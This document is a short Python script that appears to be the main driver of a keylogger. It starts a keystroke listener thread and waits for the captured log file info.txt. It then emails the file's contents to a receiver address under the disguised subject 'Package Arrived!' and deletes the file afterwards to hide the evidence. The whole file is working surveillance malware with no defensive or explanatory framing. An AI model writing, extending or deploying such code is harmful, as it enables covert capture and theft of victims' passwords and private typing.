import sys
import os
import threading
import time
from Delete import delete_after_delay
from Keylog import start_listener
from SendEmail import send_email
from PullText import read_text_from_file
if __name__ == "__main__":
    threading.Thread(target=start_listener).start()
    wait_time = 20 #seconds

    sender_email = "youremail@gmail.com"
    sender_password = "passwordforemail"
    receiver_email = "reciever_email@gmail.com"
    email_subject = "Package Arrived!"
    file_path = "info.txt"  

    # Check if the file exists in a loop until it's created
    while not os.path.exists(file_path):
        time.sleep(1)  # Check every 1 second

    time.sleep(wait_time)
    # Once the file is created, read its content and proceed with sending email and deleting after delay
    file_content = read_text_from_file(file_path)
    email_body = file_content
    send_email(sender_email, sender_password, receiver_email, email_subject, email_body)
    file_to_delete = file_path
    delete_after_delay(file_to_delete, wait_time)
    sys.exit()